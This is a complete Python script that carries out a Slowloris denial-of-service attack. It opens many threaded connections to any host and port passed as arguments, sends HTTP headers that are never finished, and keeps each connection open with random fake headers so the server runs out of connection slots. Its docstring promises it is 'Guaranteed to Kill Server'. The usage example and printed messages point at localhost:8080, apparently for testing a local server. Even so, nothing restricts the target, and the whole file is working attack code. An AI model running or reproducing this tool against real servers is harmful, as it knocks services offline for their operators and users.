#!/usr/bin/env python3
"""
AGGRESSIVE SLOWLORIS ATTACK - Guaranteed to Kill Server
=======================================================
This attack creates many connections simultaneously and keeps them alive.
"""

import socket
import threading
import time
import sys
import random
import signal

class AggressiveSlowloris:
    def __init__(self, target_host, target_port, connections):
        self.target_host = target_host
        self.target_port = int(target_port)
        self.connections = int(connections)
        self.sockets = []
        self.running = False
        self.connection_count = 0
        self.lock = threading.Lock()
        
    def create_connection(self, conn_id):
        """Create a single connection that will hang the server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)  # Long timeout to establish connection
            sock.connect((self.target_host, self.target_port))
            
            # Send partial HTTP request
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {self.target_host}\r\n".encode())
            sock.send(b"User-Agent: AggressiveSlowloris/1.0\r\n")
            sock.send(b"Accept: */*\r\n")
            sock.send(b"Connection: keep-alive\r\n")
            sock.send(b"Content-Length: 999999\r\n")
            # Don't send \r\n\r\n to complete headers
            
            # Remove timeout after connection is established
            sock.settimeout(None)
            
            with self.lock:
                self.sockets.append(sock)
            
            print(f"💀 Connection {conn_id} established and hanging server")
            
            # Keep connection alive forever
            while self.running:
                try:
                    # Send a byte every few seconds to keep alive
                    fake_header = f"X-Attack-{random.randint(1000,9999)}: {time.time()}\r\n"
                    sock.send(fake_header.encode())
                    time.sleep(random.uniform(1, 3))
                except:
                    break
                    
        except Exception as e:
            print(f"❌ Connection {conn_id} failed: {e}")
        finally:
            with self.lock:
                if sock in self.sockets:
                    self.sockets.remove(sock)
            try:
                sock.close()
            except:
                pass
    
    def launch_attack(self):
        """Launch the aggressive attack"""
        print("🚨 AGGRESSIVE SLOWLORIS ATTACK STARTING")
        print("=" * 60)
        print(f"🎯 Target: {self.target_host}:{self.target_port}")
        print(f"💀 Connections: {self.connections}")
        print("=" * 60)
        
        self.running = True
        
        # Create all connections as fast as possible
        threads = []
        for i in range(self.connections):
            thread = threading.Thread(target=self.create_connection, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.01)  # Very small delay
        
        print(f"🔥 Launched {self.connections} attack threads!")
        print("🎯 Server should be DEAD now!")
        print("Check localhost:8080 - it should be unresponsive")
        print("Press Ctrl+C to stop attack")
        
        try:
            while self.running:
                with self.lock:
                    active = len(self.sockets)
                print(f"📊 Active attack connections: {active}")
                time.sleep(2)
        except KeyboardInterrupt:
            print("\n🛑 Stopping attack...")
            self.stop()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        with self.lock:
            for sock in self.sockets[:]:
                try:
                    sock.close()
                except:
                    pass
            self.sockets.clear()
        print("✅ Attack stopped")

def signal_handler(sig, frame):
    print('\n🛑 Attack interrupted')
    sys.exit(0)

def main():
    if len(sys.argv) != 4:
        print("Usage: python AGGRESSIVE_ATTACK.py <host> <port> <connections>")
        print("Example: python AGGRESSIVE_ATTACK.py localhost 8080 50")
        sys.exit(1)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    target_host = sys.argv[1]
    target_port = sys.argv[2]
    connections = sys.argv[3]
    
    attack = AggressiveSlowloris(target_host, target_port, connections)
    attack.launch_attack()

if __name__ == '__main__':
    main() 